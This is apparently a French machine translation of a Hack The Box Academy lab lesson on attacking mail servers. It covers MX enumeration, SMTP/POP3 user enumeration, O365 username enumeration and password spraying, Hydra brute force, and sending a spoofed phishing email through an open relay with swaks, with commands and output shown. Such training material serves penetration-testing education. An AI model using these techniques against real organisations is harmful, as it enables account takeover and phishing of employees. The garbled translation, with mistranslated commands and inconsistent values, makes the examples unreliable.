Attaquer les services de messagerie
========================

* * * * *

Un `serveur de messagerie` (parfois également appelé serveur de messagerie) est un serveur qui gère et distribue les e-mails sur un réseau, généralement sur Internet. Un serveur de messagerie peut recevoir des e-mails d'un périphérique client et les envoyer à d'autres serveurs de messagerie. Un serveur de messagerie peut également envoyer des e-mails à un appareil client. Un client est généralement l'appareil sur lequel nous lisons nos e-mails (ordinateurs, smartphones, etc.).

Lorsque nous appuyons sur le bouton `Envoyer` dans notre application de messagerie (client de messagerie), le programme établit une connexion à un serveur `SMTP` sur le réseau ou sur Internet. Le nom `SMTP` signifie Simple Mail Transfer Protocol. Il s'agit d'un protocole permettant de transmettre des e-mails de clients à des serveurs et de serveurs à d'autres serveurs.

Lorsque nous téléchargeons des e-mails sur notre application de messagerie, celle-ci se connecte à un serveur `POP3` ou `IMAP4` sur Internet, ce qui permet à l'utilisateur d'enregistrer des messages dans une boîte aux lettres de serveur et de les télécharger périodiquement.

Par défaut, les clients `POP3` suppriment les messages téléchargés du serveur de messagerie. Ce comportement rend difficile l'accès aux e-mails sur plusieurs appareils, car les messages téléchargés sont stockés sur l'ordinateur local. Cependant, nous pouvons généralement configurer un client `POP3` pour conserver des copies des messages téléchargés sur le serveur.

D'autre part, par défaut, les clients `IMAP4` ne suppriment pas les messages téléchargés du serveur de messagerie. Ce comportement facilite l'accès aux messages électroniques à partir de plusieurs appareils. Voyons comment nous pouvons cibler les serveurs de messagerie.

![texte](https://academy.hackthebox.com/storage/modules/116/SMTP-IMAP-1.png)

* * * * *

Énumération
-----------

Les serveurs de messagerie sont complexes et nous obligent généralement à énumérer plusieurs serveurs, ports et services. De plus, aujourd'hui, la plupart des entreprises ont leurs services de messagerie dans le cloud avec des services tels que [Microsoft 365](https://www.microsoft.com/en-ww/microsoft-365/outlook/email-and-calendar-software-microsoft -outlook) ou [G-Suite](https://workspace.google.com/solutions/new-business/). Par conséquent, notre approche pour attaquer le service de messagerie dépend du service utilisé.

Nous pouvons utiliser l'enregistrement DNS `Mail eXchanger` (`MX`) pour identifier un serveur de messagerie. L'enregistrement MX spécifie le serveur de messagerie responsable de l'acceptation des messages électroniques au nom d'un nom de domaine. Il est possible de configurer plusieurs enregistrements MX, pointant généralement vers un ensemble de serveurs de messagerie pour l'équilibrage de charge et la redondance.

Nous pouvons utiliser des outils tels que `host` ou `dig` et des sites Web en ligne tels que [MXToolbox](https://mxtoolbox.com/) pour demander des informations sur les enregistrements MX :

#### Hôte - Enregistrements MX

Hôte - Enregistrements MX

```
dsgsec@htb[/htb]$ host -t MX hackthebox.eu

Le courrier hackthebox.eu est géré par 1 aspmx.l.google.com.

```

Hôte - Enregistrements MX

```
dsgsec@htb[/htb]$ host -t MX microsoft.com

La messagerie microsoft.com est gérée par 10 microsoft-com.mail.protection.outlook.com.

```

#### DIG - Enregistrements MX

DIG - Enregistrements MX

```
dsgsec@htb[/htb]$ dig mx plaintext.do | grep "MX" | grep -v ";"

plaintext.do. 7076 IN MX 50 mx3.zoho.com.
plaintext.do. 7076 IN MX 10 mx.zoho.com.
plaintext.do. 7076 IN MX 20 mx2.zoho.com.

```

DIG - Enregistrements MX

```
dsgsec@htb[/htb]$ creuser mx inlanefreight.com | grep "MX" | grep -v ";"

inlanefreight.com. 300 EN MX 10 mail1.inlanefreight.com.

```

#### DIG - Un record pour MX

DIG - Un record pour le MX

```
dsgsec@htb[/htb]$ host -t A mail1.inlanefreight.htb.

mail1.inlanefreight.htb a l'adresse 10.129.14.128

```

Ces enregistrements `MX` indiquent que les trois premiers services de messagerie utilisent un service cloud G-Suite (aspmx.l.google.com), Microsoft 365 (microsoft-com.mail.protection.outlook.com) et Zoho (mx .zoho.com), et le dernier peut être un serveur de messagerie personnalisé hébergé par l'entreprise.

Cette information est essentielle car les méthodes de dénombrement peuvent différer d'un service à l'autre. Par exemple, la plupart des fournisseurs de services cloud utilisent leur implémentation de serveur de messagerie et adoptent une authentification moderne, qui ouvre de nouveaux vecteurs d'attaque uniques pour chaque fournisseur de services. D'un autre côté, si l'entreprise configure le service, nous pourrions découvrir de mauvaises pratiques et des erreurs de configuration qui permettent des attaques courantes sur les protocoles de serveur de messagerie.

Si nous ciblons une implémentation de serveur de messagerie personnalisée telle que `inlanefreight.htb`, nous pouvons énumérer les ports suivants :

| Port | Services |
| --- | --- |
| `TCP/25` | SMTP non crypté |
| `TCP/143` | IMAP4 non crypté |
| `TCP/110` | POP3 non crypté |
| `TCP/465` | SMTP crypté |
| `TCP/993` | IMAP4 crypté |
| `TCP/995` | Chiffrement POP3 |

Nous pouvons utiliser l'option de script par défaut `-sC` de `Nmap` pour énumérer ces ports sur le système cible :

DIG - Un record pour le MX

```
dsgsec@htb[/htb]$ sudo nmap -Pn -sV -sC -p25,143,110,465,993,995 10.129.14.128

À partir de Nmap 7.80 ( https://nmap.org ) au 2021-09-27 17:56 CEST
Rapport d'analyse Nmap pour 10.129.14.128
L'hôte est actif (latence de 0,00025 s).

VERSION SERVICE À L'ÉTAT DU PORT
25/tcp open smtp Postfix smtpd
|_smtp-ccommandes : mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
Adresse MAC : 00:00:00:00:00:00 (VMware)

```

* * * * *

Mauvaises configurations
-----------------

Les services de messagerie utilisent l'authentification pour permettre aux utilisateurs d'envoyer et de recevoir des e-mails. Une mauvaise configuration peut se produire lorsque le service SMTP autorise l'authentification anonyme ou prend en charge les protocoles qui peuvent être utilisés pour énumérer les noms d'utilisateur valides.

#### Authentification

Le serveur SMTP dispose de différentes commandes qui peuvent être utilisées pour énumérer les noms d'utilisateur valides `VRFY`, `EXPN` et `RCPT TO`. Si nous réussissons à énumérer les noms d'utilisateur valides, nous pouvons tenter de vaporiser un mot de passe, de forcer brutalement ou de deviner un mot de passe valide. Explorons donc le fonctionnement de ces commandes.

`VRFY` cette commande demande au serveur SMTP de réception de vérifier la validité d'un nom d'utilisateur de messagerie particulier. Le serveur répondra, indiquant si l'utilisateur existe ou non. Cette fonctionnalité peut être désactivée.

#### Commande VRFY

Commande VRFY

```
dsgsec@htb[/htb]$ telnet 10.10.110.20 25

Essayer 10.10.110.20...
Connecté au 10.10.110.20.
Le caractère d'échappement est '^]'.
220 perroquet Postfix ESMTP (Debian/GNU)

Racine VRFY

252 2.0.0 racine

VRFY www-données

252 2.0.0 www-données

VRFY nouvel utilisateur

550 5.1.1 <nouvel-utilisateur> : adresse du destinataire rejetée : utilisateur inconnu dans la table des destinataires locaux

```

`EXPN` est similaire à `VRFY`, sauf que lorsqu'il est utilisé avec une liste de distribution, il répertorie tous les utilisateurs de cette liste. Cela peut être un problème plus important que la commande `VRFY` car les sites ont souvent un alias tel que "tous".

#### Commande EXPN

Commande EXPN

```
dsgsec@htb[/htb]$ telnet 10.10.110.20 25

Essayer 10.10.110.20...
Connecté au 10.10.110.20.
Le caractère d'échappement est '^]'.
220 perroquet Postfix ESMTP (Debian/GNU)

EXPN jean

250 2.1.0 john@inlanefreight.htb

Équipe d'assistance EXPN

250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb

```

`RCPT TO` identifie le destinataire de l'e-mail. Cette commande peut être répétée plusieurs fois pour un message donné afin de délivrer un seul message à plusieurs destinataires.

#### Commande RCPT TO

Commande RCPT TO

```
dsgsec@htb[/htb]$ telnet 10.10.110.20 25

Essayer 10.10.110.20...
Connecté au 10.10.110.20.
Le caractère d'échappement est '^]'.
220 perroquet Postfix ESMTP (Debian/GNU)

COURRIEL DE : test@htb.com
c'est
250 2.1.0 test@htb.com... Expéditeur ok

RCPT À:julio

550 5.1.1 juillet... Utilisateur inconnu

RCPT À:kate

550 5.1.1 kate... Utilisateur inconnu

RCPT À:Jean

250 2.1.5 Jean... Destinataire ok

```

Nous pouvons également utiliser le protocole `POP3` pour énumérer les utilisateurs en fonction de la mise en œuvre du service. Par exemple, nous pouvons utiliser la commande `USER` suivi du nom d'utilisateur, et si le serveur répond `OK`. Cela signifie que l'utilisateur existe sur le serveur.

#### Commande UTILISATEUR

Commande UTILISATEUR

```
dsgsec@htb[/htb]$ telnet 10.10.110.20 110

Essayer 10.10.110.20...
Connecté au 10.10.110.20.
Le caractère d'échappement est '^]'.
+OK Serveur POP3 prêt

UTILISATEUR

-SE TROMPER

UTILISATEUR Jean

+OK

```

Pour automatiser notre processus d'énumération, nous pouvons utiliser un outil nommé [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum). Nous pouvons spécifier le mode d'énumération avec l'argument `-M` suivi de `VRFY`, `EXPN` ou `RCPT`, et l'argument `-U` avec un fichier contenant la liste des utilisateurs que nous voulons énumérer. Selon l'implémentation du serveur et le mode d'énumération, nous devons ajouter le domaine de l'adresse e-mail avec l'argument `-D`. Enfin, nous spécifions la cible avec l'argument `-t`.

Commande UTILISATEUR

```
dsgsec@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

Démarrage de smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

  -------------------------------------------------- --------
| Informations sur la numérisation |
  -------------------------------------------------- --------

Mode ..................... RCPT
Processus de travail ......... 5
Fichier de noms d'utilisateur ........... userlist.txt
Nombre de cibles ............. 1
Nombre de noms d'utilisateur ........... 78
Port TCP cible ......... 25
Délai d'expiration de la requête ............ 5 secondes
Domaine cible ............ inlanefreight.htb

######## L'analyse a commencé le jeu. 21 avril 06:53:07 2022 #########
10.129.203.7 : jose@inlanefreight.htb existe
10.129.203.7 : pedro@inlanefreight.htb existe
10.129.203.7 : kate@inlanefreight.htb existe
######## Analyse terminée le jeu. 21 avril 06:53:18 2022 #########
3. Résultats.

78 requêtes en 11 secondes (7,1 requêtes/sec)

```

* * * * *

Nuage d'énumération
-----------------

Comme indiqué, les fournisseurs de services cloud utilisent leur propre implémentation pour les services de messagerie. Ces services ont généralement des fonctionnalités personnalisées dont nous pouvons abuser pour le fonctionnement, telles que l'énumération des noms d'utilisateur. Prenons Office 365 comme exemple et explorons comment nous pouvons énumérer les noms d'utilisateur dans cette plate-forme cloud.

[O365spray](https://github.com/0xZDH/o365spray) est un outil d'énumération de nom d'utilisateur et de pulvérisation de mot de passe destiné à Microsoft Office 365 (O365) développé par [ZDH](https://twitter.com/0xzdh). Cet outil réimplémente une collection de techniques de dénombrement et de pulvérisationes recherchés et identifiés par ceux mentionnés dans [Remerciements](https://github.com/0xZDH/o365spray#Acknowledgments). Commençons par valider si notre domaine cible utilise Office 365.

#### Vaporisateur O365

Vaporisateur O365

```
dsgsec@htb[/htb]$ python3 o365spray.py --validate --domain msplaintext.xyz

             *** Vaporisateur O365 ***

>----------------------------------------<

    > version : 2.0.4
    > domaine : msplaintext.xyz
    > valider : Vrai
    > timeout : 25 secondes
    > début : 2022-04-13 09:46:40

>----------------------------------------<

[2022-04-13 09:46:40,344] INFO : Exécution de la validation O365 pour : msplaintext.xyz
[2022-04-13 09:46:40,743] INFO : [VALIDE] Le domaine suivant utilise O365 : msplaintext.xyz

```

Maintenant, nous pouvons essayer d'identifier les noms d'utilisateur.

Vaporisateur O365

```
dsgsec@htb[/htb]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz

             *** Vaporisateur O365 ***

>----------------------------------------<

    > version : 2.0.4
    > domaine : msplaintext.xyz
    > enum : Vrai
    > fichier utilisateur : users.txt
    > enum_module : bureau
    > tarif : 10 fils
    > timeout : 25 secondes
    > début : 2022-04-13 09:48:03

>----------------------------------------<

[2022-04-13 09:48:03,621] INFO : Exécution de la validation O365 pour : msplaintext.xyz
[2022-04-13 09:48:04,062] INFO : [VALIDE] Le domaine suivant utilise O365 : msplaintext.xyz
[2022-04-13 09:48:04,064] INFO : Exécution de l'énumération des utilisateurs contre 67 utilisateurs potentiels
[2022-04-13 09:48:08,244] INFO : [VALIDE] lewen@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : [VALIDE] juurena@msplaintext.xyz
[2022-04-13 09:48:10,415] INFORMATIONS :

[ * ] Les comptes valides peuvent être trouvés à : '/opt/o365spray/enum/enum_valid_accounts.2204130948.txt'
[ * ] Tous les comptes énumérés peuvent être trouvés à : '/opt/o365spray/enum/enum_tested_accounts.2204130948.txt'

[2022-04-13 09:48:10,416] INFO : Comptes valides : 2

```

* * * * *

Attaques de mot de passe
----------------

Nous pouvons utiliser `Hydra` pour effectuer une pulvérisation de mot de passe ou une force brute contre les services de messagerie tels que `SMTP`, `POP3` ou `IMAP4`. Tout d'abord, nous devons obtenir une liste de noms d'utilisateur et une liste de mots de passe et spécifier le service que nous voulons attaquer. Voyons un exemple pour `POP3`.

#### Hydra - Attaque par mot de passe

Hydra - Attaque par mot de passe

```
dsgsec@htb[/htb]$ hydra -L utilisateurs.txt -p 'Société01 !' -f 10.10.110.20pop3

Hydra v9.1 (c) 2020 par van Hauser/THC & David Maciejak - Veuillez ne pas utiliser dans des organisations militaires ou de services secrets ou à des fins illégales (ceci n'est pas contraignant, ces *** ignorent de toute façon les lois et l'éthique).

Hydra (https://github.com/vanhauser-thc/thc-hydra) à partir du 2022-04-13 11:37:46
[INFO] plusieurs fournisseurs ont mis en place une protection contre le cracking, vérifiez d'abord avec une petite liste de mots - et restez dans la légalité !
[DATA] max 16 tâches par 1 serveur, 16 tâches au total, 67 tentatives de connexion (l:67/p:1), ~5 tentatives par tâche
[DONNÉES] attaquant pop3://10.10.110.20:110/
[110][pop3] hôte : 10.129.42.197 login : john mot de passe : Company01 !
1 cible sur 1 complétée avec succès, 1 mot de passe valide trouvé

```

Si les services cloud prennent en charge les protocoles SMTP, POP3 ou IMAP4, nous pourrons peut-être essayer de vaporiser les mots de passe à l'aide d'outils tels que "Hydra", mais ces outils sont généralement bloqués. Nous pouvons plutôt essayer d'utiliser des outils personnalisés tels que [o365spray](https://github.com/0xZDH/o365spray) ou [MailSniper](https://github.com/dafthack/MailSniper) pour Microsoft Office 365 ou [CredKing ](https://github.com/ustayready/CredKing) pour Gmail ou Okta. Gardez à l'esprit que ces outils doivent être à jour car si le fournisseur de services change quelque chose (ce qui arrive souvent), les outils peuvent ne plus fonctionner. C'est un exemple parfait de la raison pour laquelle nous devons comprendre ce que font nos outils et avoir le savoir-faire pour les modifier s'ils ne fonctionnent pas correctement pour une raison quelconque.

#### O365 Spray - Pulvérisation de mot de passe

O365 Spray - Pulvérisation de mot de passe

```
dsgsec@htb[/htb]$ python3 o365spray.py --spray -U usersfound.txt -p 'Mars2022 !' --count 1 --lockout 1 --domain msplaintext.xyz

             *** Vaporisateur O365 ***

>----------------------------------------<

    > version : 2.0.4
    > domaine : msplaintext.xyz
    > pulvérisation : Vrai
    > mot de passe : mars2022 !
    > fichier utilisateur : usersfound.txt
    > compte : 1 mots de passe/spray
    > verrouillage : 1.0 minutes
    > spray_module : oauth2
    > tarif : 10 fils
    > sécurisé : 10 comptes verrouillés
    > timeout : 25 secondes
    > début : 2022-04-14 12:26:31

>----------------------------------------<

[2022-04-14 12:26:31,757] INFO : Exécution de la validation O365 pour : msplaintext.xyz
[2022-04-14 12:26:32,201] INFO : [VALIDE] Le domaine suivant utilise O365 : msplaintext.xyz
[2022-04-14 12:26:32,202] INFO : Exécution du spray de mot de passe contre 2 utilisateurs.
[2022-04-14 12:26:32,202] INFO : Mot de passe pulvérisant les mots de passe suivants : ['Mars2022 !']
[2022-04-14 12:26:33,025] INFO : [VALID] lewen@msplaintext.xyz:March2022 !
[2022-04-14 12:26:33,048] INFORMATIONS :

[ * ] Écrire des informations d'identification valides dans : '/opt/o365spray/spray/spray_valid_credentials.2204141226.txt'
[ * ] Toutes les informations d'identification pulvérisées peuvent être trouvées à : '/opt/o365spray/spray/spray_tested_credentials.2204141226.txt'

[2022-04-14 12:26:33,048] INFO : Identifiants valides : 1

```

* * * * *

Attaques spécifiques au protocole
--------------------------

Un relais ouvert est un serveur `SMTP` (Simple Transfer Mail Protocol), qui est mal configuré et permet un relais de messagerie non authentifié. Les serveurs de messagerie configurés accidentellement ou intentionnellement en tant que relais ouverts permettent de réacheminer de manière transparente le courrier provenant de n'importe quelle source via le serveur de relais ouvert. Ce comportement masque la source des messages et donne l'impression que le courrier provient du serveur relais ouvert.

#### Relais ouvert

Du point de vue d'un attaquant, nous pouvons abuser de cela pour le phishing en envoyant des e-mails en tant qu'utilisateurs inexistants ou en usurpant l'e-mail de quelqu'un d'autre. Par exemple, imaginons que nous ciblons une entreprise avec un serveur de messagerie relais ouvert et que nous identifions qu'ils utilisent une adresse e-mail spécifique pour envoyer des notifications à leurs employés. Nous pouvons envoyer un e-mail similaire en utilisant la même adresse et ajouter notre lien de phishing avec ces informations. Avec le script `nmap smtp-open-relay` , nous pouvons déterminer si un port SMTP autorise un relais ouvert.

Relais ouvert

```
dsgsec@htb[/htb]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

À partir de Nmap 7.80 ( https://nmap.org ) au 2020-10-28 23:59 EDT
Rapport d'analyse Nmap pour 10.10.11.213
L'hôte est actif (latence de 0,28 s).

SERVICE DE L'ÉTAT DU PORT
25/tcp ouvert smtp
|_smtp-open-relay : le serveur est un relais ouvert (tests 14/16)

```

Ensuite, nous pouvons utiliser n'importe quel client de messagerie pour nous connecter au serveur de messagerie et envoyer notre courrier électronique.

Relais ouvert

```
dsgsec@htb[/htb]# swaks --from notifications@inlanefreight.com --to employee@inlanefreight.com --header 'Subject: Company Notification' --body 'Salut à tous, nous voulons avoir de vos nouvelles ! Veuillez remplir le sondage suivant. http://mycustomphishinglink.com/' --server 10.10.11.213

=== Essayer 10.10.11.213:25...
=== Connecté au 10.10.11.213.
<- 220 mail.localdomain Messagerie SMTP prêt
  -> perroquet EHLO
<- 250-mail.localdomain
<- 250-TAILLE 33554432
<- 250-8BITMIME
<- 250-STARTTLS
<- 250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
<- 250 AIDE
  -> COURRIER DE :<notifications@inlanefreight.com>
<- 250 D'accord
  -> RCPT À :<employees@inlanefreight.com>
<- 250 D'accord
  -> DONNÉES
<- 354 Données de fin avec <CR><LF>.<CR><LF>
  -> Date : jeu. 29 oct. 2020 01:36:06 -0400
  -> À : employés@inlanefreight.com
  -> De : notifications@inlanefreight.com
  -> Objet : notification de l'entreprise
  -> Identifiant du message : <20201029013606.775675@parrot>
  -> X-Mailer : swaks v20190914.0 jetmore.org/john/code/swaks/
  ->
  -> Salut à tous, nous voulons avoir de vos nouvelles ! Veuillez remplir le sondage suivant. http://mycustomphishinglink.com/
  ->
  ->
  -> .
<- 250 D'accord
  -> QUITTER
<- 221 Au revoir
=== Connexion fermée avec l'hôte distant.
```
